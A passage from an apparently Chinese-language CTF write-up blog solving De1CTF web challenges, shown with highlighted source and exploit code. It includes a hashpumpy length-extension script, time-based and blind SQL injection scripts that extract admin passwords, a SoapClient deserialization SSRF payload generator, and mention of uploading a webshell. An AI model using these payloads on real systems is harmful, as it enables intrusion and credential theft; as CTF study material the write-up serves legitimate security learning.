Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>exp脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">payload1=<span class="string">'flag.txt'</span></span><br><span class="line">payload=urllib.quote(payload1)</span><br><span class="line">url1=<span class="string">'http://139.180.128.86/geneSign?param='</span></span><br><span class="line">c=requests.get(url1+payload)</span><br><span class="line">s=c.text</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">m=hashpumpy.hashpump(s,<span class="string">'scan'</span>,<span class="string">'read'</span>,len(payload1)+<span class="number">16</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line">	<span class="string">'sign'</span>:m[<span class="number">0</span>],</span><br><span class="line">	<span class="string">'action'</span>:urllib.quote(m[<span class="number">1</span>])</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">"http://139.180.128.86/De1ta?param="</span></span><br><span class="line">r=requests.get(url+payload,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<p><img src="https://s2.ax1x.com/2019/08/06/eWb4iT.png" alt="eWb4iT.png"></p>
<h3 id="ShellShellShell"><a href="#ShellShellShell" class="headerlink" title="ShellShellShell"></a>ShellShellShell</h3><p>N1CTF魔改，不过我没做过n1ctf，所以重新做了一遍，也理一下思路。首先可以通过备份文件拿到源码，其实主要漏洞点在user.php，由于这个文件内容有点多，所以只对主要部分进行分析，首先发现了一个可疑点，也就是register函数，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'code'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(substr(md5($_POST[<span class="string">'code'</span>]),<span class="number">0</span>, <span class="number">5</span>)!==$_SESSION[<span class="string">'code'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"code error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">        $password = md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_username($username))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid user name'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;is_exists($username)) &#123;</span><br><span class="line"></span><br><span class="line">            $db = <span class="keyword">new</span> Db();</span><br><span class="line"></span><br><span class="line">            @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'username'</span>,<span class="string">'password'</span>,<span class="string">'ip'</span>,<span class="string">'is_admin'</span>,<span class="string">'allow_diff_ip'</span>),<span class="string">'ctf_users'</span>,<span class="keyword">array</span>($username,$password,get_ip(),<span class="string">'0'</span>,<span class="string">'1'</span>)); <span class="comment">//No one could be admin except me</span></span><br><span class="line">            <span class="keyword">if</span>($ret)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"The username is not unique"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一个insert操作，并在旁边加了一个注释，没有人可以成为admin，并且直接在所有注册的情况下吧is_admin字段设置为0.所以通过注册是不可能成为admin的，但是这里的表中是可能存在is_admin等于1字段的用户的，也就是在这个表中存在admin的密码，我们可以通过注入得到admin的密码，接下来寻找一下注入点</p>
<p>漏洞点出现在publish函数，代码如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">publish</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_login()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'signature'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'mood'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            $mood = addslashes(serialize(<span class="keyword">new</span> Mood((int)$_POST[<span class="string">'mood'</span>],get_ip())));</span><br><span class="line">            $db = <span class="keyword">new</span> Db();</span><br><span class="line">            @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br><span class="line">            <span class="keyword">if</span>($ret)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'pic'</span>])) </span><br><span class="line">            &#123;</span><br><span class="line">                $dir=<span class="string">'/app/upload/'</span>;</span><br><span class="line">                move_uploaded_file($_FILES[<span class="string">'pic'</span>][<span class="string">'tmp_name'</span>],$dir.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('"</span>.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>].<span class="string">"upload success');&lt;/script&gt;"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                </span><br><span class="line">     &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数有两个功能，第一个就是处理用户自主发布的信息，第二个就是处理图片上传，在第一个功能处存在明显漏洞，有可控的post字段，通过这个地方，即可达到注入拿到admin的密码，由于之前做完题没有当时写wp，现在写wp只能在复现环境上弄了。</p>
<p>成功进行延时注入</p>
<p><img src="https://s2.ax1x.com/2019/08/11/ej9BS1.png" alt="ej9BS1.png"></p>
<p>写出脚本跑一下密码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">url=<span class="string">"http://web69.node1.buuoj.cn/index.php?action=publish"</span></span><br><span class="line">cookies=&#123;</span><br><span class="line">	<span class="string">"PHPSESSID"</span>:<span class="string">"fdrl361g5am95cn61tgp5qvkp2"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"0123456789abcdefghiklmnopqrstuvwxyz"</span>:</span><br><span class="line">		data=&#123;</span><br><span class="line">	<span class="string">"signature"</span>:<span class="string">"1`,if((mid((select password from ctf_users limit 1),&#123;&#125;,1)=`&#123;&#125;`),sleep(5),1))#"</span>.format(i,j),</span><br><span class="line">	<span class="string">"mood"</span>:<span class="number">0</span></span><br><span class="line">&#125;	</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="keyword">print</span> data</span><br><span class="line">			r=requests.post(url=url,data=data,cookies=cookies,timeout=<span class="number">4.5</span>)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			flag+=j</span><br><span class="line">			<span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/08/14/mkxbFI.png" alt="mkxbFI.png"></p>
<p>解密一下md5，发现密码是jaivypassword</p>
<p>进行登陆，不过登陆不上去，必须要本地登陆，这时就想起了ssrf,接着审计代码找一下ssrf的可控点，问题出在showmess函数，简单来看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showmess</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_login()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//id,sig,mood,ip,country,subtime</span></span><br><span class="line">            $db = <span class="keyword">new</span> Db();</span><br><span class="line">            @$ret = $db-&gt;select(<span class="keyword">array</span>(<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>,<span class="string">'id'</span>),<span class="string">'ctf_user_signature'</span>,<span class="string">"userid = $this-&gt;userid order by id desc"</span>);</span><br><span class="line">            <span class="keyword">if</span>($ret) &#123;</span><br><span class="line">                $data = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">while</span> ($row = $ret-&gt;fetch_row()) &#123;</span><br><span class="line">                    $sig = $row[<span class="number">1</span>];</span><br><span class="line">                    $mood = unserialize($row[<span class="number">2</span>]);</span><br><span class="line">                    $country = $mood-&gt;getcountry();</span><br><span class="line">                    $ip = $mood-&gt;ip;</span><br><span class="line">                    $subtime = $mood-&gt;getsubtime();</span><br><span class="line">                    $allmess = <span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$row[<span class="number">3</span>],<span class="string">'sig'</span> =&gt; $sig, <span class="string">'mood'</span> =&gt; $mood, <span class="string">'ip'</span> =&gt; $ip, <span class="string">'country'</span> =&gt; $country, <span class="string">'subtime'</span> =&gt; $subtime);</span><br><span class="line">                    array_push($data, $allmess);</span><br><span class="line">                &#125;</span><br><span class="line">                $data = json_encode(<span class="keyword">array</span>(<span class="string">'code'</span>=&gt;<span class="number">0</span>,<span class="string">'data'</span>=&gt;$data));</span><br><span class="line">                <span class="keyword">return</span> $data;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $filenames = scandir(<span class="string">'adminpic/'</span>);</span><br><span class="line">        array_splice($filenames, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'data'</span>=&gt;$filenames));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有反序列化函数并且存在方法的调用，可以想到SoapClient内置方法在调用不存在的方法时会触发call函数产生ssrf，既然看到了反序列化的点了，那么接着追踪一下序列化数据的来源，代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'signature'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'mood'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            $mood = addslashes(serialize(<span class="keyword">new</span> Mood((int)$_POST[<span class="string">'mood'</span>],get_ip())));</span><br><span class="line">            $db = <span class="keyword">new</span> Db();</span><br><span class="line">            @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br><span class="line">            <span class="keyword">if</span>($ret)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这里有个int限制，我们直接通过十六进制插入到数据库就行，exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/index.php?action=login'</span>;</span><br><span class="line">$post_string = <span class="string">'username=admin&amp;password=jaivypassword&amp;code=0feeb'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=p1dj1cjhpc90jjk8atvo3ku8m2'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用这里的cookie就可以以管理员的身份登陆了，登陆后发现可以上传文件，直接上传一下shell，</p>
<p>这里直接访问upload目录就能访问到shell了，因为是app目录，在这个服务器上并没有发现flag，所以看一下/etc/hosts,接着看看这个内网网段都有什么，在0.2发现了一些问题，代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">'/var/sandbox/'</span> . md5(<span class="string">"prefix"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])&#123;</span><br><span class="line">    $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">        $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($filename);</span><br><span class="line">    <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"try again!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">"."</span>.$ext;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span><br><span class="line">    $_ = $_POST[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($_,$new_name)===<span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>($_);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can do it!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($new_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实是原题，最终结果如下</p>
<p><img src="https://s2.ax1x.com/2019/08/17/mnZPgK.png" alt="mnZPgK.png"></p>
<p>GIFTBox</p>
<p>一道当时没做出来的题，赛后来复盘一下</p>
<p>进入页面后ls一下发现一个md文件，查看一下内容，发现内容如下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">login [<span class="type">username</span>] [<span class="type">password</span>]</span><br><span class="line">logout</span><br><span class="line">launch</span><br><span class="line">targeting [<span class="type">code</span>] [<span class="type">position</span>]</span><br><span class="line">destruct</span><br></pre></td></tr></table></figure>

<p>很明显需要先登陆<code>login admin 111</code>，显示密码不正确，换个用户名显示用户不存在，通过以下对比很明显发现存在注入</p>
<p><img src="https://s2.ax1x.com/2019/08/21/mtHSF1.png" alt="mtHSF1.png"></p>
<p>去看一下请求</p>
<p><img src="https://s2.ax1x.com/2019/08/21/mtHs0J.png" alt="mtHs0J.png"></p>
<p>是可以进行注入，但是并不是太清楚totp的作用，google一下，因为我想用python写脚本，所以搜的是python totp.链接如下</p>
<p><a href="https://blog.csdn.net/juxua_xatu/article/details/50252957" target="_blank" rel="noopener">https://blog.csdn.net/juxua_xatu/article/details/50252957</a></p>
<p><a href="https://pypi.org/project/pyotp/" target="_blank" rel="noopener">https://pypi.org/project/pyotp/</a></p>
<p>可通过如下脚本拿到hint</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                payload=<span class="string">"login admin'/**/and/**/(ascii(mid((select/**/password/**/from/**/users/**/limit/**/0,1),&#123;&#125;,1))='&#123;&#125;')='1 1"</span>.format(i,j)</span><br><span class="line">                url=<span class="string">"http://web72.node1.buuoj.cn/shell.php"</span></span><br><span class="line">                true_url=url+<span class="string">'?a='</span>+urllib.quote(payload)+<span class="string">'&amp;totp='</span>+totp.now()</span><br><span class="line">                r=requests.get(true_url)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        flag+=chr(j)</span><br><span class="line">                        <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/08/21/mtXKsK.png" alt="mtXKsK.png"></p>
<p>其实我还写了一个ajax的，但是发现…可能是因为我代码的问题，不太稳定，也放一下</p>
<p><img src="https://s2.ax1x.com/2019/08/21/mN9cAf.png" alt="mN9cAf.png"></p>
<p>可以得到密码进行admin登陆，然后发现多了几个功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">targeting 设置变量</span><br><span class="line"></span><br><span class="line">launch运行</span><br><span class="line"></span><br><span class="line">destruct 重置变量</span><br></pre></td></tr></table></figure>

<p>这里还是要先看一下phpinfo()</p>
<p>payload如下</p>
